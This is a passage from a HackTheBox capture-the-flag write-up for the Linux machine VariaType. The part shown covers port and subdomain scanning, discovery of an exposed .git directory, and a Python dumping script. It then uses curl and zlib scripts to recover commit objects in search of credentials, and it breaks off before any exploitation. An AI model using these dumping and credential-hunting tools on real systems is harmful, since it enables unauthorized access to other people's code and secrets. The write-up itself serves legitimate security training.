---
title: VariaType
os: Linux
difficulty: Medium
tags:
  - Git Disclosure
  - fontTools XML Injection
  - CVE-2025-66034
  - Cron Job Command Injection
  - setuptools Path Traversal
  - CVE-2025-47273
---

# 🛡️ HTB - VariaType (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** VariaType
- **Operating System:** Linux (Debian)
- **Difficulty:** Medium
- **Vulnerabilities:** Exposed Git Directory, CDATA XML Injection & Path Traversal in fontTools (CVE-2025-66034), Filename Command Injection in Cron Job, Sudo Privilege Escalation via setuptools PackageIndex Path Traversal (CVE-2025-47273)

---

```text
\--------------------------------------------------------------------------------------------VariaType-Notes---------------------------------------------------------------------------------
```

## Step 1 - Reconnaissance

```bash
nmap -A -sS -Pn -T4  --min-rate 5000 10.129.9.136

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-17 04:31 UTC

Warning: 10.129.9.136 giving up on port because retransmission cap hit (6).

Nmap scan report for 10.129.9.136

Host is up (0.24s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

| ssh-hostkey:

|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)

|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)

80/tcp open  http    nginx 1.22.1

|_http-title: Did not follow redirect to http://variatype.htb/

|_http-server-header: nginx/1.22.1

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=43101%PV=Y%DS=2%DC=T%G=Y%TM=69B8

OS:D952%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)

OS:SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=109%TI

OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE

OS:%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=

OS:M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE

OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7

OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=

OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%

OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0

OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP

OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)

HOP RTT       ADDRESS

1   238.03 ms 10.10.14.1

2   241.56 ms 10.129.9.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 36.42 seconds
```

- 🔍 *While Looking at the web, it appears to be a font generation tool, that takes a .desingspace and .ttf/.otf files as input and then generates a master font.*

> [!IMPORTANT]
> .designspace and .ttf/.otf (OpenType) files are fundamental components in modern digital type design and variable font production. A .designspace file serves as the production "blueprint," defining how different font master designs (e.g., Light, Bold) should be interpolated to create a family, while .ttf/.otf files are the final, compiled binary files used by computers to render text

- 🔍 *I searched for some available subdomains*

```text
gobuster vhost -u http://variatype.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:             http://variatype.htb

[+] Method:          GET

[+] Threads:         50

[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

[+] User Agent:      gobuster/3.6

[+] Timeout:         10s

[+] Append Domain:   true

===============================================================

Starting gobuster in VHOST enumeration mode

===============================================================

**Found: portal.variatype.htb Status: 200 [Size: 2494]**

Progress: 4989 / 4990 (99.98%)

===============================================================

Finished

===============================================================
```

- 🔍 *I also searched for Some Sub Directories.*

```bash
python3 dirsearch.py -u "http://variatype.htb/" -x 404

&#x20; _|. _ _  _  _  _ _|_    v0.4.3

&#x20;(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm

HTTP method: GET | Threads: 25

Wordlist size: 12294

Target: http://variatype.htb/

[04:36:19] Scanning:

[04:37:47] 302 -   247B - /download/users.csv  ->  /tools/variable-font-generator

[04:37:47] 302 -   247B - /download/history.csv  ->  /tools/variable-font-generator

[04:38:34] 200 -    3KB - /services

Task Completed
```

- 🔍 *Well the  **portal.variatype.htb** Subdomain appears to be an employee login page Named as "Internal Validation Portal."*

- 🔍 *I didn't found anything to break through in the login page, therefore, i tried to upload those fonts files*

- 🔍 *Intercepted POST request*

```text
POST /tools/variable-font-generator/process HTTP/1.1

Host: variatype.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------40523995524206247783654491633

Content-Length: 1080

Origin: http://variatype.htb

Connection: close

Referer: http://variatype.htb/tools/variable-font-generator

Upgrade-Insecure-Requests: 1

Priority: u=0, i

\-----------------------------40523995524206247783654491633

Content-Disposition: form-data; name="designspace"; filename="test.designspace"

Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>

<designspace format="4.0">

&#x20;   <axes>

&#x20;       <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>

&#x20;   </axes>

&#x20;   <sources>

&#x20;       <source filename="test.ttf" name="Regular" familyname="TestFont">

&#x20;           <location>

&#x20;               <dimension name="Weight" xvalue="400"/>

&#x20;           </location>

&#x20;       </source>

&#x20;   </sources>

&#x20;   <instances>

&#x20;       <instance filename="TestFont-Regular.ttf" familyname="TestFont" stylename="Regular">

&#x20;           <location>

&#x20;               <dimension name="Weight" xvalue="400"/>

&#x20;           </location>

&#x20;       </instance>

&#x20;   </instances>

</designspace>

\-----------------------------40523995524206247783654491633

Content-Disposition: form-data; name="masters"; filename="test.ttf"

Content-Type: font/ttf

dummy font data

\-----------------------------40523995524206247783654491633--
```

- 🔍 *Intercepted Response*

```text
HTTP/1.1 302 FOUND

Server: nginx/1.22.1

Date: Tue, 17 Mar 2026 14:15:33 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 247

Connection: close

Location: /tools/variable-font-generator

Vary: Cookie

Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJGb250IGdlbmVyYXRpb24gZmFpbGVkIGR1cmluZyBwcm9jZXNzaW5nLiJdfV19.abliBQ.FFkN1uzNuhSuPdjg812_Rki1-Ow; HttpOnly; Path=/

<!doctype html>

<html lang=en>

<title>Redirecting...</title>

<h1>Redirecting...</h1>

<p>You should be redirected automatically to the target URL: <a href="/tools/variable-font-generator">/tools/variable-font-generator</a>. If not, click the link.
```

- 🔍 *Also i forgot to do one thing, bruteforcing directories on portal.variatype.htb*

```bash
python3 dirsearch.py -u "http://portal.variatype.htb/" -x 404

&#x20; _|. _ _  _  _  _ _|_    v0.4.3

&#x20;(_||| _) (/_(_|| (_| )

&#x20;

Extensions: php, asp, aspx, jsp, html, htm

HTTP method: GET | Threads: 25

Wordlist size: 12294

Target: http://portal.variatype.htb/

[14:38:16] Scanning:

[14:38:36] 301 -   169B - /.git  ->  http://portal.variatype.htb/.git/

[14:38:36] 403 -   555B - /.git/

[14:38:36] 200 -    73B - /.git/description

[14:38:36] 200 -    39B - /.git/COMMIT_EDITMSG

[14:38:36] 200 -   143B - /.git/config

[14:38:36] 200 -    23B - /.git/HEAD

[14:38:36] 403 -   555B - /.git/hooks/

[14:38:36] 200 -   137B - /.git/index

[14:38:36] 403 -   555B - /.git/info/

[14:38:36] 403 -   555B - /.git/branches/

[14:38:36] 200 -   240B - /.git/info/exclude

[14:38:36] 301 -   169B - /.git/logs/refs  ->  http://portal.variatype.htb/.git/logs/refs/

[14:38:36] 200 -   700B - /.git/logs/HEAD

[14:38:36] 403 -   555B - /.git/logs/

[14:38:36] 200 -   700B - /.git/logs/refs/heads/master

[14:38:36] 301 -   169B - /.git/logs/refs/heads  ->  http://portal.variatype.htb/.git/logs/refs/heads/

[14:38:36] 301 -   169B - /.git/refs/heads  ->  http://portal.variatype.htb/.git/refs/heads/

[14:38:36] 403 -   555B - /.git/objects/

[14:38:36] 200 -    41B - /.git/refs/heads/master

[14:38:36] 403 -   555B - /.git/refs/

[14:38:37] 301 -   169B - /.git/refs/tags  ->  http://portal.variatype.htb/.git/refs/tags/

[14:40:16] 200 -     0B - /auth.php

[14:40:42] 302 -     0B - /dashboard.php  ->  /

[14:40:46] 302 -     0B - /download.php  ->  /

[14:40:54] 301 -   169B - /files  ->  http://portal.variatype.htb/files/

[14:40:55] 403 -   555B - /files/

[14:41:02] 200 -    2KB - /index.php
```

- 🔍 *Found the whole git treasure!*

- 🔍 *Now To Download all these git files, i created a python script*

```text
#!/usr/bin/env python3

"""

Complete Portal Downloader for variatype.htb

Downloads ALL discovered files preserving directory structure

"""

import requests

import os

import sys

from urllib.parse import urljoin

import time

import logging

# Configuration

BASE_URL = "http://portal.variatype.htb"

OUTPUT_DIR = "portal_dump"

PROXY = None # Set to None if not using Burp

# Setup logging

logging.basicConfig(

&#x20;   level=logging.INFO,

&#x20;   format='%(asctime)s - %(levelname)s - %(message)s',

&#x20;   handlers=[

&#x20;       logging.FileHandler('download.log'),

&#x20;       logging.StreamHandler()

&#x20;   ]

)

# All discovered paths from your scan

PATHS = [

&#x20;   # Git repository files

&#x20;   ".git/description",

&#x20;   ".git/COMMIT_EDITMSG",

&#x20;   ".git/config",

&#x20;   ".git/HEAD",

&#x20;   ".git/index",

&#x20;   ".git/info/exclude",

&#x20;   ".git/logs/HEAD",

&#x20;   ".git/logs/refs/heads/master",

&#x20;   ".git/refs/heads/master",

&#x20;

&#x20;   # Web files

&#x20;   "auth.php",

&#x20;   "dashboard.php",

&#x20;   "download.php",

&#x20;   "index.php",

&#x20;

&#x20;   # Directory paths (for structure)

&#x20;   ".git/",

&#x20;   ".git/hooks/",

&#x20;   ".git/info/",

&#x20;   ".git/branches/",

&#x20;   ".git/logs/",

&#x20;   ".git/logs/refs/",

&#x20;   ".git/logs/refs/heads/",

&#x20;   ".git/objects/",

&#x20;   ".git/refs/",

&#x20;   ".git/refs/heads/",

&#x20;   ".git/refs/tags/",

&#x20;   "files/",

]

# Additional common git files that might exist

GIT_FILES_EXTENDED = [

&#x20;   ".git/ORIG_HEAD",

&#x20;   ".git/FETCH_HEAD",

&#x20;   ".git/MERGE_HEAD",

&#x20;   ".git/CHERRY_PICK_HEAD",

&#x20;   ".git/REBASE_HEAD",

&#x20;   ".git/REVERT_HEAD",

&#x20;   ".git/refs/remotes/origin/master",

&#x20;   ".git/refs/stash",

&#x20;   ".git/refs/notes/commits",

&#x20;   ".git/packed-refs",

&#x20;   ".git/objects/info/packs",

&#x20;   ".git/info/refs",

&#x20;   ".git/logs/refs/remotes/origin/master",

&#x20;   ".git/logs/refs/stash",

&#x20;   ".git/hooks/applypatch-msg.sample",

&#x20;   ".git/hooks/commit-msg.sample",

&#x20;   ".git/hooks/post-update.sample",

&#x20;   ".git/hooks/pre-applypatch.sample",

&#x20;   ".git/hooks/pre-commit.sample",

&#x20;   ".git/hooks/pre-push.sample",

&#x20;   ".git/hooks/pre-rebase.sample",

&#x20;   ".git/hooks/pre-receive.sample",

&#x20;   ".git/hooks/prepare-commit-msg.sample",

&#x20;   ".git/hooks/update.sample",

]

# Common PHP files that might exist

PHP_FILES_EXTENDED = [

&#x20;   "config.php",

&#x20;   "database.php",

&#x20;   "db.php",

&#x20;   "functions.php",

&#x20;   "login.php",

&#x20;   "logout.php",

&#x20;   "register.php",

&#x20;   "profile.php",

&#x20;   "admin.php",

&#x20;   "upload.php",

&#x20;   "view.php",

&#x20;   "edit.php",

&#x20;   "delete.php",

&#x20;   "api.php",

&#x20;   "ajax.php",

&#x20;   "includes/header.php",

&#x20;   "includes/footer.php",

&#x20;   "includes/navbar.php",

&#x20;   "includes/sidebar.php",

&#x20;   "includes/config.php",

&#x20;   "includes/functions.php",

&#x20;   "css/style.css",

&#x20;   "js/main.js",

&#x20;   "images/",

&#x20;   "assets/",

&#x20;   "vendor/",

&#x20;   "node_modules/",

]

# Common backup/temp files

BACKUP_FILES = [

&#x20;   "auth.php.bak",

&#x20;   "auth.php~",

&#x20;   "auth.php.swp",

&#x20;   "auth.php.old",

&#x20;   "auth.php.backup",

&#x20;   "dashboard.php.bak",

&#x20;   "dashboard.php~",

&#x20;   "download.php.bak",

&#x20;   "download.php~",

&#x20;   "index.php.bak",

&#x20;   "index.php~",

&#x20;   "config.php.bak",

&#x20;   "config.php~",

&#x20;   ".env",

&#x20;   ".env.local",

&#x20;   ".env.production",

&#x20;   ".env.development",

&#x20;   "composer.json",

&#x20;   "composer.lock",

&#x20;   "package.json",

&#x20;   "package-lock.json",

]

class PortalDownloader:

&#x20;   def __init__(self, base_url, output_dir, proxy=None):

&#x20;       self.base_url = base_url

&#x20;       self.output_dir = output_dir

&#x20;       self.session = requests.Session()

&#x20;

&#x20;       # Setup proxy if provided

&#x20;       if proxy:

&#x20;           self.session.proxies = {

&#x20;               'http': proxy,

&#x20;               'https': proxy

&#x20;           }

&#x20;

&#x20;       # Headers to mimic browser

&#x20;       self.session.headers.update({

&#x20;           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',

&#x20;           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

&#x20;           'Accept-Language': 'en-US,en;q=0.5',

&#x20;           'Accept-Encoding': 'gzip, deflate',

&#x20;           'Connection': 'keep-alive',

&#x20;       })

&#x20;

&#x20;       # Statistics

&#x20;       self.stats = {

&#x20;           'downloaded': 0,

&#x20;           'failed': 0,

&#x20;           'skipped': 0,

&#x20;           'forbidden': 0,

&#x20;           'not_found': 0

&#x20;       }

&#x20;

&#x20;   def ensure_dir(self, filepath):

&#x20;       """Create directory structure if it doesn't exist"""

&#x20;       directory = os.path.dirname(filepath)

&#x20;       if directory and not os.path.exists(directory):

&#x20;           os.makedirs(directory, exist_ok=True)

&#x20;

&#x20;   def download_file(self, path):

&#x20;       """Download a single file"""

&#x20;       url = urljoin(self.base_url, path)

&#x20;       output_path = os.path.join(self.output_dir, path)

&#x20;

&#x20;       # Skip if it's a directory path

&#x20;       if path.endswith('/'):

&#x20;           self.ensure_dir(output_path)

&#x20;           logging.info(f"[DIR] Created: {path}")

&#x20;           return True

&#x20;

&#x20;       self.ensure_dir(output_path)

&#x20;

&#x20;       try:

&#x20;           # Check if file exists and get info

&#x20;           response = self.session.get(url, timeout=10, allow_redirects=True)

&#x20;

&#x20;           # Handle different status codes

&#x20;           if response.status_code == 200:

&#x20;               with open(output_path, 'wb') as f:

&#x20;                   f.write(response.content)

&#x20;               size = len(response.content)

&#x20;               logging.info(f"[200] Downloaded: {path} ({size} bytes)")

&#x20;               self.stats['downloaded'] += 1

&#x20;               return True

&#x20;

&#x20;           elif response.status_code == 403:

&#x20;               logging.info(f"[403] Forbidden: {path}")

&#x20;               self.stats['forbidden'] += 1

&#x20;               # Save the forbidden response for reference

&#x20;               with open(output_path + '.403', 'w') as f:

&#x20;                   f.write(f"URL: {url}\\nStatus: 403 Forbidden\\n")

&#x20;               return False

&#x20;

&#x20;           elif response.status_code == 404:

&#x20;               logging.debug(f"[404] Not found: {path}")

&#x20;               self.stats['not_found'] += 1

&#x20;               return False

&#x20;

&#x20;           else:

&#x20;               logging.warning(f"[{response.status_code}] Unexpected: {path}")

&#x20;               self.stats['failed'] += 1

&#x20;               return False

&#x20;

&#x20;       except requests.exceptions.RequestException as e:

&#x20;           logging.error(f"[ERROR] Failed to download {path}: {str(e)}")

&#x20;           self.stats['failed'] += 1

&#x20;           return False

&#x20;

&#x20;   def download_all(self, paths, delay=0.1):

&#x20;       """Download all paths with rate limiting"""

&#x20;       logging.info(f"Starting download of {len(paths)} paths to {self.output_dir}")

&#x20;       start_time = time.time()

&#x20;

&#x20;       for i, path in enumerate(paths, 1):

&#x20;           logging.info(f"Progress: {i}/{len(paths)} - {path}")

&#x20;           self.download_file(path)

&#x20;           time.sleep(delay)  # Rate limiting

&#x20;

&#x20;           # Print stats every 20 files

&#x20;           if i % 20 == 0:

&#x20;               self.print_stats()

&#x20;

&#x20;       # Final stats

&#x20;       elapsed = time.time() - start_time

&#x20;       self.print_stats()

&#x20;       logging.info(f"Completed in {elapsed:.2f} seconds")

&#x20;

&#x20;   def print_stats(self):

&#x20;       """Print download statistics"""

&#x20;       logging.info("=" * 50)

&#x20;       logging.info("DOWNLOAD STATISTICS:")

&#x20;       logging.info(f"  Downloaded: {self.stats['downloaded']}")

&#x20;       logging.info(f"  Forbidden:  {self.stats['forbidden']}")

&#x20;       logging.info(f"  Not Found:  {self.stats['not_found']}")

&#x20;       logging.info(f"  Failed:     {self.stats['failed']}")

&#x20;       logging.info("=" * 50)

&#x20;

&#x20;   def try_alternative_names(self, base_path):

&#x20;       """Try common alternative names for a file"""

&#x20;       alternatives = []

&#x20;       if base_path.endswith('.php'):

&#x20;           # Try without .php

&#x20;           alternatives.append(base_path[:-4])

&#x20;           # Try with different extensions

&#x20;           for ext in ['.bak', '~', '.swp', '.old', '.backup']:

&#x20;               alternatives.append(base_path[:-4] + ext)

&#x20;       return alternatives

&#x20;

&#x20;   def extract_git_objects(self):

&#x20;       """Attempt to extract git objects from the repository"""

&#x20;       logging.info("Attempting to extract git objects...")

&#x20;

&#x20;       # First, get the HEAD commit

&#x20;       head_path = os.path.join(self.output_dir, ".git/HEAD")

&#x20;       if os.path.exists(head_path):

&#x20;           with open(head_path, 'r') as f:

&#x20;               head_content = f.read().strip()

&#x20;

&#x20;           # Parse HEAD to get current branch

&#x20;           if head_content.startswith('ref:'):

&#x20;               ref = head_content[5:].strip()

&#x20;               ref_path = os.path.join(self.output_dir, ".git", ref)

&#x20;               if os.path.exists(ref_path):

&#x20;                   with open(ref_path, 'r') as f:

&#x20;                       commit_hash = f.read().strip()

&#x20;                   logging.info(f"Current commit hash: {commit_hash}")

&#x20;

&#x20;                   # Try to download the commit object

&#x20;                   obj_dir = commit_hash[:2]

&#x20;                   obj_file = commit_hash[2:]

&#x20;                   obj_path = f".git/objects/{obj_dir}/{obj_file}"

&#x20;                   self.download_file(obj_path)

&#x20;

&#x20;       # Parse logs to find more objects

&#x20;       log_path = os.path.join(self.output_dir, ".git/logs/HEAD")

&#x20;       if os.path.exists(log_path):

&#x20;           with open(log_path, 'r') as f:

&#x20;               for line in f:

&#x20;                   parts = line.split()

&#x20;                   if len(parts) >= 2:

&#x20;                       # Each log entry has old_hash new_hash

&#x20;                       for hash_val in parts[:2]:

&#x20;                           if len(hash_val) == 40 and all(c in '0123456789abcdef' for c in hash_val):

&#x20;                               obj_dir = hash_val[:2]

&#x20;                               obj_file = hash_val[2:]

&#x20;                               obj_path = f".git/objects/{obj_dir}/{obj_file}"

&#x20;                               self.download_file(obj_path)

&#x20;                               time.sleep(0.05)

def main():

&#x20;   # Create downloader instance

&#x20;   downloader = PortalDownloader(BASE_URL, OUTPUT_DIR, PROXY)

&#x20;

&#x20;   # Combine all paths

&#x20;   all_paths = []

&#x20;

&#x20;   # Add all discovered paths

&#x20;   all_paths.extend(PATHS)

&#x20;

&#x20;   # Add extended git files

&#x20;   all_paths.extend(GIT_FILES_EXTENDED)

&#x20;

&#x20;   # Add extended PHP files

&#x20;   all_paths.extend(PHP_FILES_EXTENDED)

&#x20;

&#x20;   # Add backup files

&#x20;   all_paths.extend(BACKUP_FILES)

&#x20;

&#x20;   # Add paths with different case variations (for case-sensitive systems)

&#x20;   case_variations = []

&#x20;   for path in all_paths:

&#x20;       if path.endswith('.php'):

&#x20;           # Add uppercase variations

&#x20;           case_variations.append(path.upper())

&#x20;           case_variations.append(path.capitalize())

&#x20;

&#x20;   all_paths.extend(case_variations)

&#x20;

&#x20;   # Remove duplicates while preserving order

&#x20;   seen = set()

&#x20;   unique_paths = []

&#x20;   for path in all_paths:

&#x20;       if path not in seen:

&#x20;           seen.add(path)

&#x20;           unique_paths.append(path)

&#x20;

&#x20;   logging.info(f"Total unique paths to try: {len(unique_paths)}")

&#x20;

&#x20;   # Download all files

&#x20;   downloader.download_all(unique_paths, delay=0.1)

&#x20;

&#x20;   # After downloading, try to extract git objects

&#x20;   downloader.extract_git_objects()

&#x20;

&#x20;   # Final summary

&#x20;   logging.info("\\n" + "=" * 60)

&#x20;   logging.info("DOWNLOAD COMPLETE")

&#x20;   logging.info(f"Files saved to: {os.path.abspath(OUTPUT_DIR)}")

&#x20;   logging.info("Check download.log for detailed logs")

&#x20;   logging.info("=" * 60)

&#x20;

&#x20;   # List important files found

&#x20;   logging.info("\\nImportant files found:")

&#x20;   for root, dirs, files in os.walk(OUTPUT_DIR):

&#x20;       for file in files:

&#x20;           if not file.endswith('.403'):  # Skip forbidden markers

&#x20;               filepath = os.path.join(root, file)

&#x20;               size = os.path.getsize(filepath)

&#x20;               if size > 0:  # Only show non-empty files

&#x20;                   rel_path = os.path.relpath(filepath, OUTPUT_DIR)

&#x20;                   logging.info(f"  - {rel_path} ({size} bytes)")

if __name__ == "__main__":

&#x20;   try:

&#x20;       main()

&#x20;   except KeyboardInterrupt:

&#x20;       logging.info("\\nDownload interrupted by user")

&#x20;       sys.exit(0)

&#x20;   except Exception as e:

&#x20;       logging.error(f"Unexpected error: {str(e)}")

&#x20;       sys.exit(1)
```

- 🔍 *After Downloading all the files, you may be able to see the portal_dump folder and inside it go to .git folder.*

```text
┌──(root㉿fsocity)-[/home/…/Season-10/VariaType/portal_dump/.git]

└─# ls

branches        description  index  objects

COMMIT_EDITMSG  HEAD         info   ORIG_HEAD

config          hooks        logs   refs

&#x20;
```

- 🔍 *you'll see something like this, now before enumerating this, lets take a look at config file*

```text
[core]

&#x20;       repositoryformatversion = 0

&#x20;       filemode = true

&#x20;       bare = false

&#x20;       logallrefupdates = true

[user]

&#x20;       name = Dev Team

&#x20;       email = dev@variatype.htb
```

- 🔍 *We got a user **Dev***

- 🔍 *After enumerating all the folders, i found something interesting inside the objects folder*

```text
┌──(root㉿fsocity)-[/home/…/Season-10/VariaType/portal_dump/.git]

└─# cd objects

&#x20;

┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]

└─# ls

00  50  6f  75  info

&#x20;

┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]

└─# cd 6f

&#x20;

┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/6f]

└─# ls

021da6be7086f2595befaa025a83d1de99478b

&#x20;

┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/6f]

└─# cd ..

&#x20;

┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]

└─# cd 75

&#x20;

┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/75]

└─# ls

3b5f5957f2020480a19bf29a0ebc80267a4a3d

&#x20;

┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/75]

└─# cd ..

&#x20;

┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]

└─# cd 50

&#x20;

┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/50]

└─# ls

30e791b764cb2a50fcb3e2279fea9737444870

&#x20;

┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/50]

└─# cd ..

&#x20;

┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]

└─# cd 00

&#x20;
```

- 🔍 *Lets look at the logs*

```text
&#x20;git log --oneline

753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline

5030e79 feat: initial portal implementation
```

> [!IMPORTANT]
> 1. The Older Change (The Foundation)

```text
5030e79 feat: initial portal implementation

5030e79: A unique ID (hash) for this specific "save point."

feat: Short for feature. It tells other developers that something brand new was added.

The Message: Someone built the first version of a "portal" (like a login page or a main dashboard). This was the starting point for that part of the app.
```

> [!IMPORTANT]
> 2. The Latest Change (The Update)

```text
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline

753b5f5: The ID for this newer "save point."

(HEAD -> master): This is a marker saying, "You are here." It means your project is currently sitting on the master branch at this exact version.

fix: This tells you a problem was corrected or a small necessary adjustment was made.

The Message: A "gitbot" user was added. This is likely a "robot" account used by the server to automatically check if the code works correctly (validation) before it's officially finished.
```

> [!IMPORTANT]
> Now We found some hashes before, what are those?

```text
Those 40-character strings are Full SHA-1 Hashes, the unique "fingerprints" Git uses to identify every single object in your repository.

While your previous view showed you the short versions (like 753b5f5), these are the long versions of those same IDs.

1\. What do they represent?

In Git, a hash isn't just a random serial number. It is a calculated checksum based on:

The Content: Every single character in every file you changed.

The Metadata: Your name, email, the exact second you committed, and the commit message.

The History: The ID of the commit that came right before it (the "parent").
```

- 🔍 *In short it tells us every detail about a commit.*

- 🔍 *Now lets try to decode every single hash, i made a bash script for that*

```text
for dir in *; do

&#x20;   if [ -d "$dir" ]; then

&#x20;       cd "$dir"

&#x20;       for file in *; do

&#x20;           # Skip if no files exist in the subdirectory

&#x20;           [ -e "$file" ] || continue

&#x20;

&#x20;           # Run Python to decompress and check the file

&#x20;           python3 -c "

import zlib, sys

try:

&#x20;   with open('$file', 'rb') as f:

&#x20;       # Git objects are zlib compressed

&#x20;       data = zlib.decompress(f.read())

&#x20;       if b'gitbot' in data:

&#x20;           print('\\n*** FOUND DATA IN: $dir/$file ***')

&#x20;           # Show the content, ignoring non-text characters

&#x20;           print(data.decode('utf-8', errors='ignore'))

except Exception:

&#x20;   pass

" 2>/dev/null

&#x20;       done

&#x20;       cd ..

&#x20;   fi

done

Checking 00/*...

Checking 50/30e791b764cb2a50fcb3e2279fea9737444870...

Checking 6f/021da6be7086f2595befaa025a83d1de99478b...

Checking 75/3b5f5957f2020480a19bf29a0ebc80267a4a3d...

*** FOUND CREDENTIALS IN 75/3b5f5957f2020480a19bf29a0ebc80267a4a3d ***

commit 259tree c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4

parent 5030e791b764cb2a50fcb3e2279fea9737444870

author Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

committer Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

fix: add gitbot user for automated validation pipeline
```

- 🔍 *Here  we're only seeing the commit object itself, not the actual file content with the credentials. The commit object points to a tree object (c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4) that we don't have.*

- 🔍 *Try to manually download those objects*

```bash
curl -o c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 \\

&#x20;    http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4
```

- 🔍 *Lets use this python script to decompress this hash properly*

```bash
python3 -c "

import zlib

import os

# Read and decompress the tree object

with open('c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4', 'rb') as f:

&#x20;   compressed = f.read()

&#x20;   data = zlib.decompress(compressed)

&#x20;

print('Raw tree data (hex):')

print(data.hex())

print('\\n' + '='*50)

print('Parsed tree object:')

print('='*50)

# Skip the 'tree [size]\\0' header

header_end = data.find(b'\\0')

if header_end > 0:

&#x20;   print(f'Header: {data[:header_end].decode()}')

&#x20;   pos = header_end + 1

&#x20;

&#x20;   # Parse tree entries

&#x20;   while pos < len(data):

&#x20;       # Find the space that separates mode and filename

&#x20;       space_pos = data.find(b' ', pos)

&#x20;       if space_pos == -1:

&#x20;           break

&#x20;

&#x20;       mode = data[pos:space_pos].decode()

&#x20;       pos = space_pos + 1

&#x20;

&#x20;       # Find null terminator after filename

&#x20;       null_pos = data.find(b'\\0', pos)

&#x20;       if null_pos == -1:

&#x20;           break

&#x20;

&#x20;       filename = data[pos:null_pos].decode()

&#x20;       pos = null_pos + 1

&#x20;

&#x20;       # Next 20 bytes are SHA-1 hash

&#x20;       sha1 = data[pos:pos+20].hex()

&#x20;       pos += 20

&#x20;

&#x20;       print(f'\\nFile: {filename}')

&#x20;       print(f'  Mode: {mode}')

&#x20;       print(f'  SHA1: {sha1}')

&#x20;

&#x20;       # Check if this is auth.php

&#x20;       if filename == 'auth.php':

&#x20;           print('  *** THIS IS THE AUTH.PHP BLOB ***')

&#x20;           print(f'  Blob hash: {sha1}')

&#x20;           print(f'  Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3')

